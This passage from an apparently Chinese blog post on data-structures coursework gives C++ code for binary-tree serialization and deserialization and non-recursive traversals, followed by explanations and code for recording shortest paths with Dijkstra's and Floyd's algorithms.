rt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print_Manu</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1.采用二叉链式存储创建二叉树B1\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2.采用先序序列化显示输出序列，并存储到文件中\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3.从文件中读出序列，并反序列化的递归方法构造二叉树B2\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"4.从文件中读出序列，并反序列化的非递归方法构造二叉树B3\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"5.使用非递归的方法输出二叉树的中序遍历序列\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"6.使用非递归的方法输出二叉树的后序遍历序列\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"7.销毁释放二叉树B1,B2,B3\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0.退出\n\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dot_f</span><span class="params">(FILE *f)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(FLAG)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">","</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">","</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> FLAG = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dot</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(FLAG)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">","</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> FLAG = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">Read_node</span><span class="params">(FILE *f)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="built_in">fscanf</span>(f, <span class="string">"%c"</span>, &amp;c);</span><br><span class="line">&#125;<span class="keyword">while</span>(c == <span class="string">','</span>);</span><br><span class="line"><span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Pre_Order</span><span class="params">(BT *rt, FILE *f)</span></span>&#123;<span class="comment">//先序遍历显示输出序列 </span></span><br><span class="line">Dot_f(f);</span><br><span class="line"><span class="keyword">if</span>(rt == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"#"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"#"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, rt-&gt;data);</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"%c"</span>, rt-&gt;data);</span><br><span class="line"></span><br><span class="line">Pre_Order(rt-&gt;lch, f);</span><br><span class="line">Pre_Order(rt-&gt;rch, f);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BT *<span class="title">Deserialize_RE</span><span class="params">(FILE *f)</span></span>&#123;<span class="comment">//递归反序列化 </span></span><br><span class="line">BT *rt = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span> c = Read_node(f);</span><br><span class="line"><span class="keyword">if</span>(c == <span class="string">'#'</span>) <span class="keyword">return</span> rt;</span><br><span class="line">rt = (BT*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BT));</span><br><span class="line">rt-&gt;data = c;</span><br><span class="line">rt-&gt;lch = Deserialize_RE(f);</span><br><span class="line">rt-&gt;rch = Deserialize_RE(f);</span><br><span class="line"><span class="keyword">return</span> rt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BT *<span class="title">Deserialize_NOT</span><span class="params">(FILE *f)</span></span>&#123;<span class="comment">//非递归反序列化 </span></span><br><span class="line"><span class="built_in">stack</span>&lt;BT*&gt; mystack;</span><br><span class="line">BT *rt = <span class="literal">NULL</span>;</span><br><span class="line">BT *ret;</span><br><span class="line"><span class="keyword">char</span> c = Read_node(f);</span><br><span class="line"><span class="keyword">if</span>(c == <span class="string">'#'</span>) <span class="keyword">return</span> rt;</span><br><span class="line">rt = (BT*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BT));</span><br><span class="line">rt-&gt;process = <span class="number">1</span>;</span><br><span class="line">rt-&gt;data = c;</span><br><span class="line">mystack.push(rt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(mystack.empty() == <span class="number">0</span>)&#123;</span><br><span class="line">BT *t = mystack.top();</span><br><span class="line"><span class="keyword">if</span>(t-&gt;process == <span class="number">0</span>)&#123;<span class="comment">//验证该结点是否存在 </span></span><br><span class="line">t-&gt;data = Read_node(f);</span><br><span class="line"><span class="keyword">if</span>(t-&gt;data == <span class="string">'#'</span>)&#123;<span class="comment">//结点不存在 </span></span><br><span class="line"><span class="built_in">free</span>(t);</span><br><span class="line">ret = <span class="literal">NULL</span>;</span><br><span class="line">mystack.pop();</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;<span class="comment">//结点存在 </span></span><br><span class="line">t-&gt;process += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(t-&gt;process == <span class="number">1</span>)&#123;<span class="comment">//左子树 </span></span><br><span class="line">t-&gt;lch = (BT*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BT));</span><br><span class="line">mystack.push(t-&gt;lch);</span><br><span class="line">t-&gt;lch-&gt;process = <span class="number">0</span>;</span><br><span class="line">t-&gt;process += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(t-&gt;process == <span class="number">2</span>)&#123;<span class="comment">//右子树</span></span><br><span class="line">t-&gt;lch = ret;</span><br><span class="line">t-&gt;rch = (BT*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BT));</span><br><span class="line">mystack.push(t-&gt;rch);</span><br><span class="line">t-&gt;rch-&gt;process = <span class="number">0</span>;</span><br><span class="line">t-&gt;process += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;<span class="comment">//返回 </span></span><br><span class="line">t-&gt;rch = ret;</span><br><span class="line">mystack.pop();</span><br><span class="line">ret = t;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> rt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">In_Order</span><span class="params">(BT *rt)</span></span>&#123;</span><br><span class="line"><span class="built_in">stack</span>&lt;BT*&gt; mystack;</span><br><span class="line">BT *p;</span><br><span class="line">p = rt;</span><br><span class="line"><span class="keyword">while</span>(mystack.empty()==<span class="number">0</span> || p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(p != <span class="literal">NULL</span>)&#123;<span class="comment">//循环找到最左边的叶子 </span></span><br><span class="line">mystack.push(p);</span><br><span class="line">p = p-&gt;lch;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Dot();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"#,"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(mystack.empty() == <span class="number">0</span>)&#123;<span class="comment">//输出该叶子并且回退，然后找到最邻近的右儿子 </span></span><br><span class="line">p = mystack.top();</span><br><span class="line">mystack.pop();</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, p-&gt;data);</span><br><span class="line">p = p-&gt;rch;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">Dot();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"#"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Post_Order</span><span class="params">(BT *rt)</span></span>&#123;</span><br><span class="line"><span class="built_in">stack</span>&lt;BT*&gt; mystack;</span><br><span class="line">BT *p;</span><br><span class="line"><span class="keyword">if</span>(rt == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"#"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mystack.push(rt);</span><br><span class="line">rt-&gt;process = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(mystack.empty() == <span class="number">0</span>)&#123;</span><br><span class="line">p = mystack.top();</span><br><span class="line"><span class="keyword">if</span>(p-&gt;process == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(p == <span class="literal">NULL</span>)&#123;</span><br><span class="line">Dot();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"#"</span>);</span><br><span class="line">mystack.pop();</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;lch == <span class="literal">NULL</span>)&#123;</span><br><span class="line">Dot();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"#"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">mystack.push(p-&gt;lch);</span><br><span class="line">p-&gt;lch-&gt;process = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">p-&gt;process += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(p-&gt;process == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;rch == <span class="literal">NULL</span>)&#123;</span><br><span class="line">Dot();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"#"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">mystack.push(p-&gt;rch);</span><br><span class="line">p-&gt;rch-&gt;process = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">p-&gt;process += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Dot();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, p-&gt;data);</span><br><span class="line">mystack.pop();</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">BT *b1 = <span class="literal">NULL</span>;</span><br><span class="line">BT *b2 = <span class="literal">NULL</span>;</span><br><span class="line">BT *b3 = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> Choice;</span><br><span class="line">FILE *f;</span><br><span class="line">Print_Manu();</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Input your choice:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;Choice);</span><br><span class="line"><span class="keyword">if</span>(!Choice) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">switch</span>(Choice)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:&#123;</span><br><span class="line"><span class="keyword">int</span> mind, maxd;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Input the minimum depth:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;mind);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Input the maximum depth:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;maxd);</span><br><span class="line"><span class="keyword">if</span>(mind &gt; maxd)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Invalid!\n\n"</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">Free_BT(b1); <span class="comment">//把之前储存的树销毁</span></span><br><span class="line">b1 = Generate_BT(<span class="number">1</span>, mind, maxd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Binary tree generated.\n\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:&#123;</span><br><span class="line">f = fopen(<span class="string">"tree.txt"</span>, <span class="string">"w"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"serialization_pre_order:"</span>);</span><br><span class="line">FLAG = <span class="number">0</span>;</span><br><span class="line">Pre_Order(b1, f);</span><br><span class="line">fclose(f);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:&#123;</span><br><span class="line">f = fopen(<span class="string">"tree.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">b2 = Deserialize_RE(f);</span><br><span class="line">fclose(f);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Succeeded to load in_order tree to b2.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:&#123;</span><br><span class="line">f = fopen(<span class="string">"tree.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">b3 = Deserialize_NOT(f);</span><br><span class="line">fclose(f);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Succeeded to load post_order tree to b3.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"serialization_in_order:"</span>);</span><br><span class="line">FLAG = <span class="number">0</span>;</span><br><span class="line">In_Order(b2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"serialization_post_order:"</span>);</span><br><span class="line">FLAG = <span class="number">0</span>;</span><br><span class="line">Post_Order(b3);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:&#123;</span><br><span class="line">Free_BT(b1);</span><br><span class="line">Free_BT(b2);</span><br><span class="line">Free_BT(b3);</span><br><span class="line">b1 = b2 = b3 = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Succeeded to free b1,b2,b3!\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp2">exp2</h2><p>dijkstra算法以及Floyd算法保存最短路径的方法</p><p><strong>dijkstra</strong>：在每次加入新点到集合中时，把这些点的father记为上一个点，最后一起逆序输出</p><p><strong>Floyd</strong>：在进行三重循环的时候，如果找到了最短路（i到j中有一个k结点），</p><p>那么就把&quot;path(i)(j)“改为&quot;path(i)(k)”，<strong>意味着从i到j的最短路上，i的下一个结点是 i到k的最短路上i的下一个结点</strong></p><p>这句话好好理解一下（是一种递归定义，无限递归后，最终path(i)(j)就是i到j最短路上i的下一个节点）</p><p>参考资料：<a href="https://blog.csdn.net/weixin_39956356/article/details/80620667" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39956356/article/details/80620667</a></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 500</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 1e9+7 </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[MAX+<span class="number">1</span>][MAX+<span class="number">1</span>], n;</span><br><span class="line"><span class="keyword">int</span> shortest[MAX+<span class="number">1</span>][MAX+<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> dist[MAX+<span class="number">1</span>],path[MAX+<span class="number">1</span>][MAX+<span class="number">1</span>]; <span class="comment">//path数组负责记录从u到v，以u为起点的下一个结点的位置 </span></span><br><span class="line"><span class="keyword">char</span> name[MAX+<span class="number">1</span>][<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> fa[MAX+<span class="number">1</span>];<span class="comment">//用于在dijkstra里面保存某个结点的前一个结点 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print_Manu</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1.Import a map.(and store it in the disk)\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2.Calculate the shortest distance from a to b.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3.Calculate the shortest route of all.(and store it in the disk)\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"4.import the map from disk and output the shortest route between two locations.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0.Quit.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Input_Map</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"input names:\n"</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"No.%d:"</span>, i);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>, name[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line"><span class="built_in">map</span>[i][j] = INF;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt;= n; j++)&#123;</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"From %s to %s (-1 stands for infinite):"</span>, name[i], name[j]);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;t);</span><br><span class="line"><span class="keyword">if</span>(t == <span class="number">-1</span>) <span class="keyword">continue</span>;<span class="comment">//距离无限远 </span></span><br><span class="line"><span class="built_in">map</span>[i][j] = <span class="built_in">map</span>[j][i] = t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">map</span>[i][i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Search_Id</span><span class="params">(<span class="keyword">char</span> str[])</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(name[i], str)==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Dijkstra</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"> <span class="built_in">map</span>[i][i] = <span class="number">0</span>;<span class="comment">//要把所有的结点首先剔除S集合 </span></span><br><span class="line">    <span class="built_in">map</span>[s][s] = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;<span class="comment">//将s的邻接点加入dist </span></span><br><span class="line"> dist[i] = INF;</span><br><span class="line"> fa[i] = i;</span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">map</span>[s][i] &lt; INF)&#123;</span><br><span class="line"> dist[i] = <span class="built_in">map</span>[s][i];</span><br><span class="line"> fa[i] = s;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n<span class="number">-1</span>; i++)&#123;<span class="comment">//循环n-1次 </span></span><br><span class="line"> <span class="keyword">int</span> MIN = INF, u = <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)&#123;<span class="comment">//在剩下的点中找一个与S集合邻接的，距离s点最短的点 </span></span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">map</span>[j][j] == <span class="number">0</span> &amp;&amp; dist[j]&lt;MIN)&#123;</span><br><span class="line"> u = j;</span><br><span class="line"> MIN = dist[j];</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">map</span>[u][u] = <span class="number">1</span>;<span class="comment">//加入这个点到S集合中 </span></span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">map</span>[j][j] == <span class="number">0</span>)<span class="comment">//找到了u点，接下来把与u点邻接的所有边更新一下 </span></span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">map</span>[u][j] &lt; INF &amp;&amp; dist[u] + <span class="built_in">map</span>[u][j] &lt; dist[j])&#123;</span><br><span class="line"> dist[j] = dist[u] + <span class="built_in">map</span>[u][j];</span><br><span class="line"> fa[j] = u;<span class="comment">//把j的父亲设为u </span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">return</span> dist[t];<span class="comment">//返回距离 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Floyd</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">path[i][j] = j;<span class="comment">//初始化path数组 </span></span><br><span class="line"><span class="built_in">memcpy</span>(shortest, <span class="built_in">map</span>, <span class="keyword">sizeof</span>(<span class="built_in">map</span>));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">1</span>; k &lt;= n; k++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line"><span class="keyword">if</span>(shortest[i][j] &gt; shortest[i][k] + shortest[k][j])&#123;</span><br><span class="line">shortest[i][j] = shortest[i][k] + shortest[k][j];</span><br><span class="line">path[i][j] = path[i][k];<span class="comment">//代表i到j的路径上，i的下一个结点为k </span></span><br><span class="line"><span class="comment">//重要 这段代码值得好好理解 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Print_Manu();</span><br><span class="line"><span class="keyword">int</span> Choice;</span><br><span class="line">FILE *f;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\ninput optcode:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;Choice);</span><br><span class="line"><span class="keyword">switch</span>(Choice)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\ninput n:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">Input_Map(n);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Succeeded to import a map!\n\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"input two names(separate with a space):\n"</span>);</span><br><span class="line"><span class="keyword">char</span> name1[<span class="number">20</span>], name2[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> s, t;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s%s"</span>, name1, name2);</span><br><span class="line">s = Search_Id(name1);</span><br><span class="line">t = Search_Id(name2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(s &lt; <span class="number">0</span> || t &lt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Invalid name!\n"</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">int</span> res = Dijkstra(s, t);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The shortest distance is %d\n"</span>, res);</span><br><span class="line"><span class="keyword">if</span>(res == INF)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"which means no path.\n"</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"path: "</span>);</span><br><span class="line"><span class="keyword">int</span> k = t;</span><br><span class="line"><span class="built_in">stack</span> &lt;<span class="keyword">int</span>&gt; mystack;</span><br><span class="line"><span class="keyword">while</span>(k != s)&#123;</span><br><span class="line">mystack.push(k);</span><br><span class="line">k = fa[k];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s "</span>, name[s]);</span><br><span class="line"><span class="keyword">while</span>(mystack.empty() != <span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-&gt; %s "</span>, name[mystack.top()]);</span><br><span class="line">mystack.pop();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:&#123;</span><br><span class="line">f = fopen(<span class="string">"AllPath.dat"</span>, <span class="string">"w"</span>);</span><br><span class="line">Floyd();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"All the shortest distance:\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"%d\n"</span>, n);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"%s "</span>, name[i]);</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; 